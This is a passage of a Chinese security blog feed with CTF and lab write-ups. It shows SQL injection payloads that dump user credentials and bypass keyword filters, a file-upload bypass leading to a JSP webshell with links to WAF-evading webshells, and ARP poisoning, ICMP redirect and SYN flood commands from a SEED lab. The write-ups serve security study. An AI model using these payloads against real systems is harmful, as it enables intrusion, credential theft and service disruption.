&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http://localhost/sqli-labs-master/Less-1/?id=15&amp;apos; union select 1,group_concat(concat_ws(&amp;apos;_&amp;apos;,id,username,password)) ,3 from users -- +&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/sql-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%881%EF%BC%89.assets/1525487267862.png&quot; alt=&quot;1525487267862&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入&quot;&gt;&lt;a href=&quot;#less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入&quot; class=&quot;headerlink&quot; title=&quot;less 2  GET - Error based - Intiger based (基于错误的GET整型注入)&quot;&gt;&lt;/a&gt;less 2  GET - Error based - Intiger based (基于错误的GET整型注入)&lt;/h3&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="SQL注入" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL" scheme="http://blog.Lhaihai.wang/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>百度杯CTF夺旗大赛9月场第二场SQL</title>
    <link href="http://blog.Lhaihai.wang/2018/05/02/%E7%99%BE%E5%BA%A6%E6%9D%AFCTF%E5%A4%BA%E6%97%97%E5%A4%A7%E8%B5%9B9%E6%9C%88%E5%9C%BA%E7%AC%AC%E4%BA%8C%E5%9C%BASQL/"/>
    <id>http://blog.Lhaihai.wang/2018/05/02/百度杯CTF夺旗大赛9月场第二场SQL/</id>
    <published>2018-05-02T13:48:55.000Z</published>
    <updated>2018-05-02T14:29:56.476Z</updated>
    
    <content type="html"><![CDATA[<h4 id="首先看看是否有字符过滤"><a href="#首先看看是否有字符过滤" class="headerlink" title="首先看看是否有字符过滤"></a>首先看看是否有字符过滤</h4><p>把所有字符串都试一遍</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?id = 1~!@$%^&amp;*()_+-=&#123;&#125;[]&apos;&quot;;&lt;&gt;/?</span><br></pre></td></tr></table></figure><p>发现&lt;&gt;直接被删除，即是：<code>sele&lt;&gt;ct --&gt; select</code><br>符号+被替换为空格等等</p><a id="more"></a><h4 id="获取当前表的字段个数："><a href="#获取当前表的字段个数：" class="headerlink" title="获取当前表的字段个数："></a>获取当前表的字段个数：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 ord&lt;&gt;er by 3</span><br></pre></td></tr></table></figure><p> 正常返回</p><h4 id="联合注入，获取可以显示的字段"><a href="#联合注入，获取可以显示的字段" class="headerlink" title="联合注入，获取可以显示的字段"></a>联合注入，获取可以显示的字段</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 uni&lt;&gt;on sel&lt;&gt;ect 1,2,3</span><br></pre></td></tr></table></figure><p>执行之后，第二个字段被显示出来，说明三个字段只有第二个字段可以显示。</p><h4 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union selec&lt;&gt;t  1,group_concat(table_name),3 from information_schema.tables where table_schema =database()</span><br></pre></td></tr></table></figure><p>爆出 info 表</p><h4 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union selec&lt;&gt;t  1,group_concat(column_name),3 from information_schema.columns where table_name= &apos;info&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id,title,flAg_T5ZNdrm</span><br></pre></td></tr></table></figure><h4 id="爆flag"><a href="#爆flag" class="headerlink" title="爆flag"></a>爆flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union selec&lt;&gt;t  1,group_concat(flAg_T5ZNdrm),3 from info</span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1d80a990-37a8-48e2-9fd5-a4de39cbcf60&#125;,test</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.cnblogs.com/wangleiblog/p/5924451.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangleiblog/p/5924451.html</a></p><p><a href="http://www.2cto.com/Article/201301/182519.html" target="_blank" rel="noopener">sql注入字符绕过方法：</a></p><p><a href="http://blog.csdn.net/praifire/article/details/51926863" target="_blank" rel="noopener">sql注入实例一枚：</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;首先看看是否有字符过滤&quot;&gt;&lt;a href=&quot;#首先看看是否有字符过滤&quot; class=&quot;headerlink&quot; title=&quot;首先看看是否有字符过滤&quot;&gt;&lt;/a&gt;首先看看是否有字符过滤&lt;/h4&gt;&lt;p&gt;把所有字符串都试一遍&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;/index.php?id = 1~!@$%^&amp;amp;*()_+-=&amp;#123;&amp;#125;[]&amp;apos;&amp;quot;;&amp;lt;&amp;gt;/?&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;发现&amp;lt;&amp;gt;直接被删除，即是：&lt;code&gt;sele&amp;lt;&amp;gt;ct --&amp;gt; select&lt;/code&gt;&lt;br&gt;符号+被替换为空格等等&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="I春秋" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/I%E6%98%A5%E7%A7%8B/"/>
    
    
      <category term="SQL" scheme="http://blog.Lhaihai.wang/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>红帽杯Web-simple_upload</title>
    <link href="http://blog.Lhaihai.wang/2018/05/02/%E7%BA%A2%E5%B8%BD%E6%9D%AFWeb-simple-upload/"/>
    <id>http://blog.Lhaihai.wang/2018/05/02/红帽杯Web-simple-upload/</id>
    <published>2018-05-02T02:57:34.000Z</published>
    <updated>2018-05-02T03:04:25.736Z</updated>
    
    <content type="html"><![CDATA[<h3 id="simple-upload"><a href="#simple-upload" class="headerlink" title="simple upload"></a>simple upload</h3><p>这次在你面前的网站的功能非常简单，接受挑战吧！</p><h4 id="0x01-抓包发现admin-0，改为1登录"><a href="#0x01-抓包发现admin-0，改为1登录" class="headerlink" title="0x01 抓包发现admin=0，改为1登录"></a>0x01 抓包发现admin=0，改为1登录</h4><a id="more"></a><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E7%BA%A2%E5%B8%BD%E6%9D%AF.assets/1525084268144.png" alt="1525084268144"></p><h4 id="0x02-文件上传"><a href="#0x02-文件上传" class="headerlink" title="0x02 文件上传"></a>0x02 文件上传</h4><p>只要把<code>Content-Type</code> 改为<code>image/jpeg</code>就可以绕过</p><h4 id="0x03-上传木马"><a href="#0x03-上传木马" class="headerlink" title="0x03 上传木马"></a>0x03 上传木马</h4><p>测试了php，asp都不行，最后用jsp</p><p>在根目录发现flag，下载</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E7%BA%A2%E5%B8%BD%E6%9D%AF.assets/1525084399401.png" alt="1525084399401"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E7%BA%A2%E5%B8%BD%E6%9D%AF.assets/1525084525023.png" alt="1525084525023"></p><p>Jsp webshell:<a href="https://github.com/dingody/jspy" target="_blank" rel="noopener">https://github.com/dingody/jspy</a></p><p><a href="http://www.cnblogs.com/yubenliu/p/5556090.html" target="_blank" rel="noopener">一句话木马和中国菜刀的结合拿webshell</a></p><p><a href="https://blog.csdn.net/settoken/article/details/53114781" target="_blank" rel="noopener">2016年11月整理的最新php免杀一句话木马, 2017php免杀一句话(php过狗一句话,过狗菜刀,2016过狗一句话,2016php免杀一句话,php过waf一句话)</a></p><p><a href="https://blog.csdn.net/settoken/article/details/51581776" target="_blank" rel="noopener">整理的最新WebSHell (php过狗一句话,过狗菜刀,2016过狗一句话,2016php免杀一句话)</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;simple-upload&quot;&gt;&lt;a href=&quot;#simple-upload&quot; class=&quot;headerlink&quot; title=&quot;simple upload&quot;&gt;&lt;/a&gt;simple upload&lt;/h3&gt;&lt;p&gt;这次在你面前的网站的功能非常简单，接受挑战吧！&lt;/p&gt;
&lt;h4 id=&quot;0x01-抓包发现admin-0，改为1登录&quot;&gt;&lt;a href=&quot;#0x01-抓包发现admin-0，改为1登录&quot; class=&quot;headerlink&quot; title=&quot;0x01 抓包发现admin=0，改为1登录&quot;&gt;&lt;/a&gt;0x01 抓包发现admin=0，改为1登录&lt;/h4&gt;
    
    </summary>
    
      <category term="WriteUp" scheme="http://blog.Lhaihai.wang/categories/WriteUp/"/>
    
    
      <category term="upload" scheme="http://blog.Lhaihai.wang/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>TCP/IP</title>
    <link href="http://blog.Lhaihai.wang/2018/05/01/TCP-IP/"/>
    <id>http://blog.Lhaihai.wang/2018/05/01/TCP-IP/</id>
    <published>2018-04-30T16:36:26.000Z</published>
    <updated>2018-05-26T05:31:54.260Z</updated>
    
    <content type="html"><![CDATA[<h3 id="TCP-IP"><a href="#TCP-IP" class="headerlink" title="TCP/IP"></a>TCP/IP</h3><a id="more"></a><h5 id="SEEDUbuntu-A号-ip"><a href="#SEEDUbuntu-A号-ip" class="headerlink" title="SEEDUbuntu A号 ip"></a>SEEDUbuntu A号 ip</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[03/30/2018 23:42] seed@ubuntu:~$ ifconfig</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 00:0c:29:2a:28:90  </span><br><span class="line">          inet addr:192.168.100.136  Bcast:192.168.100.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:fe2a:2890/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:887 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:634 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:136676 (136.6 KB)  TX bytes:74886 (74.8 KB)</span><br><span class="line">          Interrupt:19 Base address:0x2000 </span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:60 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:60 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:5659 (5.6 KB)  TX bytes:5659 (5.6 KB)</span><br></pre></td></tr></table></figure><h5 id="SEEDUbuntu-B号-ip"><a href="#SEEDUbuntu-B号-ip" class="headerlink" title="SEEDUbuntu B号 ip"></a>SEEDUbuntu B号 ip</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[03/31/2018 01:22] seed@ubuntu:~$ ifconfig</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 00:0c:29:79:62:d3  </span><br><span class="line">          inet addr:192.168.100.137  Bcast:192.168.100.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:fe79:62d3/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:361 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:271 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:84607 (84.6 KB)  TX bytes:37560 (37.5 KB)</span><br><span class="line">          Interrupt:19 Base address:0x2000 </span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:35 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:35 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:3397 (3.3 KB)  TX bytes:3397 (3.3 KB)</span><br></pre></td></tr></table></figure><h5 id="Kali-Linux-ip"><a href="#Kali-Linux-ip" class="headerlink" title="Kali Linux ip"></a>Kali Linux ip</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.100.135  netmask 255.255.255.0  broadcast 192.168.100.255</span><br><span class="line">        inet6 fe80::20c:29ff:fe8d:a7b0  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:8d:a7:b0  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 65  bytes 4574 (4.4 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 25  bytes 2319 (2.2 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 20  bytes 1116 (1.0 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 20  bytes 1116 (1.0 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><h5 id=""><a href="#" class="headerlink" title=" "></a> </h5><h4 id="Task-1-ARP-cache-poisoning"><a href="#Task-1-ARP-cache-poisoning" class="headerlink" title="Task (1) : ARP cache poisoning"></a>Task (1) : ARP cache poisoning</h4><hr><h5 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h5><p>ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E9%98%BB%E5%A1%9E" target="_blank" rel="noopener">网络阻塞</a>，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA" target="_blank" rel="noopener">主机</a>ARP缓存中的IP-MAC条目，造成网络中断或<a href="https://baike.baidu.com/item/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB" target="_blank" rel="noopener">中间人攻击</a>。</p><p>攻击者向电脑A发送一个伪造的ARP响应，告诉电脑A：电脑B的IP地址192.168.0.2对应的MAC地址是00-aa-00-62-c6-03，电脑A信以为真，将这个对应关系写入自己的ARP缓存表中，以后发送数据时，将本应该发往电脑B的数据发送给了攻击者。同样的，攻击者向电脑B也发送一个伪造的ARP响应，告诉电脑B：电脑A的IP地址192.168.0.1对应的MAC地址是00-aa-00-62-c6-03，电脑B也会将数据发送给攻击者。</p><h5 id="netwox-80-–help"><a href="#netwox-80-–help" class="headerlink" title="netwox 80 –help"></a>netwox 80 –help</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[03/31/2018 01:16] root@ubuntu:/home/seed# netwox 80 --help</span><br><span class="line">Title: Periodically send ARP replies</span><br><span class="line">Usage: netwox 80 -e eth -i ip [-d device] [-E eth] [-I ip] [-s uint32]</span><br><span class="line">Parameters:</span><br><span class="line"> -e|--eth eth                   ethernet address &#123;00:0C:29:2A:28:90&#125;</span><br><span class="line"> -i|--ip ip                     IP address &#123;192.168.100.136&#125;</span><br><span class="line"> -d|--device device             device for spoof &#123;Eth0&#125;</span><br><span class="line"> -E|--eth-dst eth               to whom answer &#123;0:8:9:a:b:c&#125;</span><br><span class="line"> -I|--ip-dst ip                 to whom answer &#123;5.6.7.8&#125;</span><br><span class="line"> -s|--sleep uint32              sleep delay in ms &#123;1000&#125;</span><br><span class="line"> --help2                        display full help</span><br><span class="line">Example: netwox 80 -e &quot;00:0C:29:2A:28:90&quot; -i &quot;192.168.100.136&quot;</span><br><span class="line">Example: netwox 80 --eth &quot;00:0C:29:2A:28:90&quot; --ip &quot;192.168.100.136&quot;</span><br></pre></td></tr></table></figure><p>fping -g 192.168.100.1/24 </p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/11111111.png" alt=""></p><p>arpspoof </p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/212222222.png" alt=""></p><p>被欺骗主机</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/arpspoof-victim.png" alt="rpspoof-victi"></p><p><a href="https://www.cnblogs.com/rebrust/p/6096101.html" target="_blank" rel="noopener">https://www.cnblogs.com/rebrust/p/6096101.html</a></p><h4 id="Task-2-ICMP-Redirect-Attack"><a href="#Task-2-ICMP-Redirect-Attack" class="headerlink" title="Task (2) : ICMP Redirect Attack"></a>Task (2) : ICMP Redirect Attack</h4><hr><h5 id="（1）实验原理"><a href="#（1）实验原理" class="headerlink" title="（1）实验原理"></a>（1）实验原理</h5><p>ICMP重定向攻击<br>ICMP重定向信息是路由器向主机提供实时的路由信息，当一个主机收到ICMP重定向信息时，它就会根据这个信息来更新自己的路由表。由于缺乏必要的合法性检查，如果一个黑客想要被攻击的主机修改它的路由表，黑客就会发送ICMP重定向信息给被攻击的主机，让该主机按照黑客的要求来修改路由表。</p><h5 id="（2）安装-traceroute"><a href="#（2）安装-traceroute" class="headerlink" title="（2）安装 traceroute"></a>（2）安装 traceroute</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install traceroute</span><br></pre></td></tr></table></figure><p>三台主机都可以traceroute到外网，如traceroute百度的时候，经过的第一个路由器是192.168.100.2</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1523688602985.png" alt="1523688602985"></p><h5 id="（3）为了让主机A能够正常转发数据包，需要对主机A进行如下设置："><a href="#（3）为了让主机A能够正常转发数据包，需要对主机A进行如下设置：" class="headerlink" title="（3）为了让主机A能够正常转发数据包，需要对主机A进行如下设置："></a>（3）为了让主机A能够正常转发数据包，需要对主机A进行如下设置：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure><h5 id="（4）使用netwox86号工具可以完成这个攻击"><a href="#（4）使用netwox86号工具可以完成这个攻击" class="headerlink" title="（4）使用netwox86号工具可以完成这个攻击"></a>（4）使用netwox86号工具可以完成这个攻击</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netwox 86 -f &quot;host 192.168.100.137&quot; -g &quot;192.168.100.136&quot; -i &quot;192.168.100.2&quot;</span><br></pre></td></tr></table></figure><p>顺序第一个IP是被攻击者IP，第二个是攻击者IP，第三个是路由器IP </p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1523689718380.png" alt="1523689718380"></p><h5 id="（5）然后克隆机再次traceroute，第一次经过的路由是"><a href="#（5）然后克隆机再次traceroute，第一次经过的路由是" class="headerlink" title="（5）然后克隆机再次traceroute，第一次经过的路由是"></a>（5）然后克隆机再次traceroute，第一次经过的路由是</h5><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/1523689633112.png" alt="1523689633112"></p><h4 id="Task-3-SYN-Flooding-Attack"><a href="#Task-3-SYN-Flooding-Attack" class="headerlink" title="Task 3 : SYN Flooding Attack"></a>Task 3 : SYN Flooding Attack</h4><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -na</span><br></pre></td></tr></table></figure><p>netstat -na 来显示所有连接的端口并用数字表示.</p><p><a href="https://linux.cn/article-2434-1.html" target="_blank" rel="noopener">https://linux.cn/article-2434-1.html</a></p><p><a href="https://blog.csdn.net/thanklife/article/details/55193248" target="_blank" rel="noopener">https://blog.csdn.net/thanklife/article/details/55193248</a></p><p><a href="https://blog.csdn.net/yes_angel/article/details/46773073" target="_blank" rel="noopener">https://blog.csdn.net/yes_angel/article/details/46773073</a></p><h5 id="实验原理-1"><a href="#实验原理-1" class="headerlink" title="实验原理"></a>实验原理</h5><p>TCP SYN<a href="https://baike.baidu.com/item/%E6%B3%9B%E6%B4%AA" target="_blank" rel="noopener">泛洪</a>发生在OSI第四层，这种方式利用TCP协议的特性，就是<a href="https://baike.baidu.com/item/%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B" target="_blank" rel="noopener">三次握手</a>。攻击者发送TCP SYN，SYN是TCP<a href="https://baike.baidu.com/item/%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B" target="_blank" rel="noopener">三次握手</a>中的第一个数据包，而当服务器返回ACK后，该攻击者就不对其进行再确认，那这个TCP连接就处于<a href="https://baike.baidu.com/item/%E6%8C%82%E8%B5%B7%E7%8A%B6%E6%80%81" target="_blank" rel="noopener">挂起状态</a>，也就是所谓的半连接状态，服务器收不到再确认的话，还会重复发送ACK给攻击者。这样更加会浪费服务器的<a href="https://baike.baidu.com/item/%E8%B5%84%E6%BA%90" target="_blank" rel="noopener">资源</a>。攻击者就对服务器发送非常大量的这种TCP连接，由于每一个都没法完成<a href="https://baike.baidu.com/item/%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B" target="_blank" rel="noopener">三次握手</a>，所以在服务器上，这些TCP连接会因为<a href="https://baike.baidu.com/item/%E6%8C%82%E8%B5%B7%E7%8A%B6%E6%80%81" target="_blank" rel="noopener">挂起状态</a>而消耗CPU和内存，最后服务器可能<a href="https://baike.baidu.com/item/%E6%AD%BB%E6%9C%BA" target="_blank" rel="noopener">死机</a>，就无法为正常用户提供服务了。</p><h5 id="netwox-76-–help"><a href="#netwox-76-–help" class="headerlink" title="netwox 76 –help"></a>netwox 76 –help</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[03/30/2018 23:47] seed@ubuntu:~$ netwox 76 --help</span><br><span class="line">Title: Synflood</span><br><span class="line">Usage: netwox 76 -i ip -p port [-s spoofip]</span><br><span class="line">Parameters:</span><br><span class="line"> -i|--dst-ip ip                 destination IP address &#123;5.6.7.8&#125;</span><br><span class="line"> -p|--dst-port port             destination port number &#123;80&#125;</span><br><span class="line"> -s|--spoofip spoofip           IP spoof initialization type &#123;linkbraw&#125;</span><br><span class="line"> --help2                        display full help</span><br><span class="line">Example: netwox 76 -i &quot;5.6.7.8&quot; -p &quot;80&quot;</span><br><span class="line">Example: netwox 76 --dst-ip &quot;5.6.7.8&quot; --dst-port &quot;80&quot;</span><br></pre></td></tr></table></figure><p>当输入 netwox 76 命令时，提示错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[03/30/2018 23:50] seed@ubuntu:~$ netwox 76 -i &quot;192.168.100.135&quot; -p &quot;80&quot;</span><br><span class="line">Error 3002 : not supported</span><br><span class="line"> hint: errno = 19 = No such device</span><br><span class="line"> hint: libnet_init(): UID or EUID of 0 required</span><br></pre></td></tr></table></figure><p>这是因为它需要管理员权限，su</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[03/30/2018 23:59] seed@ubuntu:~$ su</span><br><span class="line">Password: </span><br><span class="line">[03/30/2018 23:59] root@ubuntu:/home/seed#</span><br></pre></td></tr></table></figure><p>这时候可以使用netwox 76 泛洪攻击了</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/TCPIP%E5%AE%9E%E9%AA%8C.assets/SYN-attacking.png" alt="YN-attackin"></p><p>第二次：</p><p><img 